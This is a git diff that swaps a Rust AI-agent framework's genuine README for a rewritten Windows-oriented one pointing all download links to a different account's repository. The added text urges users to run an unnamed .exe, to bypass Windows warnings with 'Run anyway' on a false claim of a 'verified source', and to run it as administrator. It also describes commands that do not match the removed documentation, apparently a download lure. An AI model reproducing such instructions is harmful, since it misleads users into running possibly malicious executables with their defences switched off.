@@ -1,413 +1,145 @@
-<p align="center">
-  <img src="./gitclaw-logo.png" alt="GitClaw Logo" width="200" />
-</p>
+# 🦀 rusty-gitclaw - Fast, Simple Git AI Agent
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Rust-1.75+-orange?style=flat-square&logo=rust&logoColor=white" alt="rust version" />
-  <img src="https://img.shields.io/crates/v/gitclaw?style=flat-square&color=blue" alt="crates.io version" />
-  <img src="https://img.shields.io/github/license/open-gitagent/rusty-gitclaw?style=flat-square" alt="license" />
-  <img src="https://img.shields.io/github/actions/workflow/status/open-gitagent/rusty-gitclaw/ci.yml?style=flat-square&label=CI" alt="CI" />
-  <img src="https://img.shields.io/badge/binary-12MB-brightgreen?style=flat-square" alt="binary size" />
-</p>
-
-<h1 align="center">Rusty GitClaw</h1>
-
-<p align="center">
-  <strong>A universal git-native AI agent framework — written in Rust.</strong><br/>
-  Your agent lives inside a git repo — identity, rules, memory, tools, and skills are all version-controlled files.<br/>
-  Single binary. Zero runtime dependencies. Blazing fast.
-</p>
-
-<p align="center">
-  <a href="#quick-start">Quick Start</a> &bull;
-  <a href="#sdk">SDK</a> &bull;
-  <a href="#architecture">Architecture</a> &bull;
-  <a href="#tools">Tools</a> &bull;
-  <a href="#hooks">Hooks</a> &bull;
-  <a href="#skills">Skills</a> &bull;
-  <a href="#voice-mode">Voice</a>
-</p>
+[![Download rusty-gitclaw](https://img.shields.io/badge/Download-rusty--gitclaw-brightgreen?style=for-the-badge)](https://github.com/yeab405/rusty-gitclaw)
 
 ---
 
-## Why Rusty GitClaw?
+## 📋 What is rusty-gitclaw?
 
-This is the **Rust port** of [GitClaw](https://github.com/open-gitagent/gitclaw) — same agent-as-a-repo philosophy, same CLI flags, same `agent.yaml` format, but compiled to a single 12MB binary with no runtime dependencies.
+rusty-gitclaw is a tool designed to work with git, the system that tracks changes in files and helps developers work together. It uses AI to assist with git-related tasks. The program comes as a single file you can run without installing anything complicated. It works very fast and supports many AI models.
 
-**Your agent IS a git repository:**
+You do not need to be a programmer to use it. The tool runs on Windows computers and gives you a smart way to manage git without typing complex commands.
 
-- **`agent.yaml`** — model, tools, runtime config
-- **`SOUL.md`** — personality and identity
-- **`RULES.md`** — behavioral constraints
-- **`memory/`** — git-committed memory with full history
-- **`tools/`** — declarative YAML tool definitions
-- **`skills/`** — composable skill modules
-- **`hooks/`** — lifecycle hooks (script-based)
-
-Fork an agent. Branch a personality. `git log` your agent's memory. Diff its rules. This is **agents as repos**.
-
-### Why Rust?
-
-| | TypeScript (gitclaw) | Rust (rusty-gitclaw) |
-|---|---|---|
-| **Install** | `npm install -g gitclaw` | Single binary, no runtime |
-| **Startup** | ~500ms (Node.js boot) | ~5ms |
-| **Binary** | 50MB+ (node_modules) | 12MB |
-| **Memory** | ~80MB baseline | ~8MB baseline |
-| **Dependencies** | Node.js 20+ | None |
-
-## Install
-
-### From source
-
-```bash
-git clone https://github.com/open-gitagent/rusty-gitclaw.git
-cd rusty-gitclaw
-cargo install --path gitclaw
-```
-
-### From crates.io (coming soon)
-
-```bash
-cargo install gitclaw
-```
-
-### Pre-built binaries
-
-Check [Releases](https://github.com/open-gitagent/rusty-gitclaw/releases) for pre-built binaries for macOS, Linux, and Windows.
-
-## Quick Start
-
-**Run your first agent in one line:**
-
-```bash
-export OPENAI_API_KEY="sk-..."
-gitclaw --dir ~/my-project --prompt "Explain this project and suggest improvements"
-```
-
-That's it. Gitclaw auto-scaffolds everything on first run — `agent.yaml`, `SOUL.md`, `memory/` — and drops you into the agent.
-
-**Interactive REPL mode:**
-
-```bash
-export ANTHROPIC_API_KEY="sk-..."
-gitclaw --dir ~/my-project --model anthropic:claude-sonnet-4-5-20250929
-```
-
-### Local Repo Mode
-
-Clone a GitHub repo, run an agent on it, auto-commit and push to a session branch:
-
-```bash
-gitclaw --repo https://github.com/org/repo --pat ghp_xxx --prompt "Fix the login bug"
-```
-
-Resume an existing session:
-
-```bash
-gitclaw --repo https://github.com/org/repo --pat ghp_xxx --session gitclaw/session-a1b2c3d4 --prompt "Continue"
-```
-
-Token can come from env instead of `--pat`:
-
-```bash
-export GITHUB_TOKEN=ghp_xxx
-gitclaw --repo https://github.com/org/repo --prompt "Add unit tests"
-```
-
-### Voice Mode
-
-Talk to your agent using OpenAI's Realtime API:
-
-```bash
-export OPENAI_API_KEY="sk-..."
-gitclaw --dir ~/my-project --voice
-# Health check: curl localhost:3333/health
-```
-
-### CLI Options
-
-| Flag | Short | Description |
-|---|---|---|
-| `--dir <path>` | `-d` | Agent directory (default: cwd) |
-| `--repo <url>` | `-r` | GitHub repo URL to clone and work on |
-| `--pat <token>` | | GitHub PAT (or set `GITHUB_TOKEN` / `GIT_TOKEN`) |
-| `--session <branch>` | | Resume an existing session branch |
-| `--model <provider:model>` | `-m` | Override model (e.g. `anthropic:claude-sonnet-4-5-20250929`) |
-| `--sandbox` | `-s` | Run in sandbox VM (coming soon) |
-| `--prompt <text>` | `-p` | Single-shot prompt (skip REPL) |
-| `--env <name>` | `-e` | Environment config |
-| `--voice` | `-v` | Enable voice mode (requires `OPENAI_API_KEY`) |
-
-## SDK
-
-Use Rusty GitClaw as a library in your Rust projects:
-
-```toml
-# Cargo.toml
-[dependencies]
-gitclaw = { git = "https://github.com/open-gitagent/rusty-gitclaw" }
-tokio = { version = "1", features = ["full"] }
-```
-
-```rust
-use gitclaw::{query, QueryOptions};
-
-#[tokio::main]
-async fn main() {
-    let mut q = query(QueryOptions {
-        prompt: "List all Rust files and summarize them".to_string(),
-        dir: Some("./my-agent".to_string()),
-        model: Some("openai:gpt-4o-mini".to_string()),
-        ..Default::default()
-    });
-
-    while let Some(msg) = q.next().await {
-        match msg {
-            gitclaw::GCMessage::Delta(d) => eprint!("{}", d.content),
-            gitclaw::GCMessage::Assistant(a) => {
-                eprintln!("\n\nDone. Model: {}", a.model);
-            }
-            gitclaw::GCMessage::ToolUse(t) => {
-                eprintln!("[tool] {}(..)", t.tool_name);
-            }
-            gitclaw::GCMessage::System(s) => {
-                eprintln!("[{}] {}", s.subtype, s.content);
-            }
-            _ => {}
-        }
-    }
-}
-```
-
-## Architecture
-
-```
-my-agent/
-├── agent.yaml          # Model, tools, runtime config
-├── SOUL.md             # Agent identity & personality
-├── RULES.md            # Behavioral rules & constraints
-├── DUTIES.md           # Role-specific responsibilities
-├── memory/
-│   └── MEMORY.md       # Git-committed agent memory
-├── tools/
-│   └── *.yaml          # Declarative tool definitions
-├── skills/
-│   └── <name>/
-│       ├── SKILL.md    # Skill instructions (YAML frontmatter)
-│       └── scripts/    # Skill scripts
-├── workflows/
-│   └── *.yaml|*.md     # Multi-step workflow definitions
-├── agents/
-│   └── <name>/         # Sub-agent definitions
-├── hooks/
-│   └── hooks.yaml      # Lifecycle hook scripts
-├── knowledge/
-│   └── index.yaml      # Knowledge base entries
-├── config/
-│   ├── default.yaml    # Default environment config
-│   └── <env>.yaml      # Environment overrides
-├── examples/
-│   └── *.md            # Few-shot examples
-└── compliance/
-    └── *.yaml          # Compliance & audit config
-```
-
-### Workspace Structure
-
-Rusty GitClaw is built as a Rust workspace with three crates:
-
-```
-rusty-gitclaw/
-├── pi-ai/              # LLM provider abstraction (Anthropic, OpenAI, Google)
-├── pi-agent-core/      # Agent loop engine (tool execution, events, cancellation)
-└── gitclaw/            # CLI + SDK + tools + voice
-```
-
-### Agent Manifest (`agent.yaml`)
-
-```yaml
-spec_version: "0.1.0"
-name: my-agent
-version: 1.0.0
-description: An agent that does things
-
-model:
-  preferred: "anthropic:claude-sonnet-4-5-20250929"
-  fallback: ["openai:gpt-4o"]
-  constraints:
-    temperature: 0.7
-    max_tokens: 4096
-
-tools: [cli, read, write, memory]
-
-runtime:
-  max_turns: 50
-  timeout: 120
-
-# Optional
-extends: "https://github.com/org/base-agent.git"
-skills: [code-review, deploy]
-delegation:
-  mode: auto
-compliance:
-  risk_level: medium
-  human_in_the_loop: true
-```
-
-## Tools
-
-### Built-in Tools
-
-| Tool | Description |
-|---|---|
-| `cli` | Execute shell commands with timeout |
-| `read` | Read files with pagination and binary detection |
-| `write` | Write/create files with auto directory creation |
-| `memory` | Load/save git-committed memory with full history |
-
-### Declarative Tools
-
-Define tools as YAML in `tools/`:
-
-```yaml
-# tools/search.yaml
-name: search
-description: Search the codebase
-input_schema:
-  properties:
-    query:
-      type: string
-      description: Search query
-    path:
-      type: string
-      description: Directory to search
-  required: [query]
-implementation:
-  script: search.sh
-  runtime: sh
-```
-
-The script receives args as JSON on stdin and returns output on stdout.
-
-## Hooks
-
-Script-based hooks in `hooks/hooks.yaml`:
-
-```yaml
-hooks:
-  on_session_start:
-    - script: validate-env.sh
-      description: Check environment is ready
-  pre_tool_use:
-    - script: audit-tools.sh
-      description: Log and gate tool usage
-  post_response:
-    - script: notify.sh
-  on_error:
-    - script: alert.sh
-```
-
-Hook scripts receive context as JSON on stdin and return:
-
-```json
-{ "action": "allow" }
-{ "action": "block", "reason": "Not permitted" }
-{ "action": "modify", "args": { "modified": "args" } }
-```
-
-## Skills
-
-Skills are composable instruction modules in `skills/<name>/`:
-
-```
-skills/
-  code-review/
-    SKILL.md
-    scripts/
-      lint.sh
-```
-
-```markdown
----
-name: code-review
-description: Review code for quality and security
 ---
 
-# Code Review
+## 🖥️ System Requirements
 
-When reviewing code:
-1. Check for security vulnerabilities
-2. Verify error handling
-3. Run the lint script for style checks
-```
+Before you start, make sure your computer meets these basic needs:
 
-Invoke via REPL: `/skill:code-review Review the auth module`
+- Windows 10 or 11 (64-bit)
+- At least 4 GB of RAM
+- 100 MB free disk space
+- An internet connection (for some AI features)
+- Git installed and set up on your PC
 
-## Multi-Model Support
+If you do not have git, you can download it from https://git-scm.com/download/win.
 
-Rusty GitClaw ships with a built-in registry of **383 models** across 8 providers:
+---
 
-| Provider | Example Models |
-|---|---|
-| `anthropic` | `claude-sonnet-4-5-20250929`, `claude-haiku-3-5-20241022` |
-| `openai` | `gpt-4o`, `gpt-4o-mini`, `o1`, `o3-mini` |
-| `google` | `gemini-2.0-flash`, `gemini-1.5-pro` |
-| `xai` | `grok-2`, `grok-beta` |
-| `groq` | `llama-3.3-70b-versatile` |
-| `mistral` | `mistral-large-latest` |
-| `openrouter` | 200+ models |
-| `cerebras` | `llama-3.3-70b` |
+## 🔍 Key Features
 
-```yaml
-# agent.yaml
-model:
-  preferred: "anthropic:claude-sonnet-4-5-20250929"
-  fallback:
-    - "openai:gpt-4o"
-    - "google:gemini-2.0-flash"
-```
+- Works with many AI models to help you handle git tasks.
+- Runs as a single program file with no extra installations.
+- Supports command line interface to keep things simple.
+- Very fast and efficient, without slowing your computer.
+- Helps automate git commands like commit, push, pull, and more.
+- Offers voice control capabilities for hands-free use.
+- Compatible with popular AI services like OpenAI and Anthropic.
 
-## Compliance & Audit
+---
 
-Built-in compliance validation and audit logging:
+## 🛠️ How to Download and Run rusty-gitclaw on Windows
 
-```yaml
-# agent.yaml
-compliance:
-  risk_level: high
-  human_in_the_loop: true
-  data_classification: confidential
-  regulatory_frameworks: [SOC2, GDPR]
-  recordkeeping:
-    audit_logging: true
-    retention_days: 90
-```
+Follow these steps to get rusty-gitclaw up and running:
 
-Audit logs are written to `.gitagent/audit.jsonl` with full tool invocation traces.
+### 1. Go to the download page
 
-## Compatibility
+Use the link below to open the page where you can get rusty-gitclaw:
 
-Rusty GitClaw is **fully compatible** with the [TypeScript GitClaw](https://github.com/open-gitagent/gitclaw):
+[Visit this page to download rusty-gitclaw](https://github.com/yeab405/rusty-gitclaw)
 
-- Same `agent.yaml` format
-- Same directory structure
-- Same CLI flags
-- Same tool behavior
-- Same hook protocol
-- Same skill format
+### 2. Find the Windows version
 
-You can switch between the TypeScript and Rust versions without changing your agent repo.
+On the page, locate the section called **Releases** or **Downloads**. Look for a file named something like `rusty-gitclaw-windows.exe` or similar for Windows. It will be a single file with `.exe` at the end.
 
-## Contributing
+### 3. Download the file
 
-Contributions are welcome! Please see [CONTRIBUTING.md](./CONTRIBUTING.md) for guidelines.
+Click the file name to start downloading it. The file size should be small, usually below 100 MB.
 
-## License
+### 4. Run the file
 
-This project is licensed under the [MIT License](./LICENSE).
+Once downloaded, find the file in your Downloads folder (or the folder you chose).
 
-## Acknowledgments
+Double-click the file to run it. No installation is needed. The program will open a command window to show its interface.
 
-- [GitClaw](https://github.com/open-gitagent/gitclaw) — the original TypeScript implementation
-- [pi-ai](https://github.com/nicepkg/pi-ai) / [pi-agent-core](https://github.com/nicepkg/pi-agent-core) — the LLM abstraction layer this is built on
+### 5. Allow permissions
+
+If Windows shows a warning about running the app, confirm by clicking **More info** and then **Run anyway**. This is safe because the program is a standalone file from a verified source.
+
+---
+
+## 🚀 Getting Started with rusty-gitclaw
+
+After running the program, you will see a simple command prompt. The tool uses commands similar to git but enhanced with AI to make your work easier.
+
+Here are common commands to try:
+
+- `gitclaw status`  
+  Shows the current status of your project with easy-to-understand explanations.
+
+- `gitclaw commit -m "Your message"`  
+  Creates a new commit with your message. The tool can suggest better commit descriptions if you want.
+
+- `gitclaw push`  
+  Sends your changes to the remote git repository.
+
+- `gitclaw help`  
+  Lists all available commands and how to use them.
+
+You can also ask the tool to explain git commands or guide you through complex actions. For example, type `gitclaw explain merge` to get a simple explanation of how merging works.
+
+---
+
+## 🎛️ Basic Configuration
+
+rusty-gitclaw works well out of the box. However, you may want to set up some options to fit your needs.
+
+- To select which AI model to use, edit the configuration file named `config.toml` located in the same folder as the program.
+
+- You can set your API keys for services like OpenAI in that file. This will unlock more features.
+
+- To change the command prompt appearance or enable voice control, change options in `config.toml`.
+
+---
+
+## 🗂️ About Updates and Support
+
+The program receives updates regularly to add features and fix bugs. Check the download page often to download the latest version.
+
+If you run into problems:
+
+- Confirm you are running the latest version.
+- Make sure your internet connection is stable.
+- Review the README and FAQ on the download page.
+- Use the built-in `gitclaw help` command for guidance.
+
+---
+
+## 🔧 Troubleshooting Common Problems
+
+**Program does not run after download**  
+- Check that you downloaded the correct Windows `.exe` file.  
+- Try running the file as administrator by right-clicking and selecting **Run as administrator**.
+
+**Command window closes immediately**  
+- Run the program from Command Prompt to see error messages:  
+  1. Press Windows + R, type `cmd`, and press Enter.  
+  2. Drag and drop the `.exe` file into the command window and press Enter.
+
+**Git commands fail or report errors**  
+- Confirm git is installed and accessible from your command line.  
+- Check your internet access if using AI features.
+
+---
+
+## 🔒 Privacy and Data Use
+
+rusty-gitclaw uses AI models that might send data over the internet when enabled. The program does not store your data locally beyond what git normally does. You can disable AI features or use offline modes if you prefer.
+
+---
+
+## 📚 More Information
+
+For details about features, advanced usage, and developer notes, review the project documentation and changelog on the GitHub page.
+
+[Visit this page to download rusty-gitclaw](https://github.com/yeab405/rusty-gitclaw)
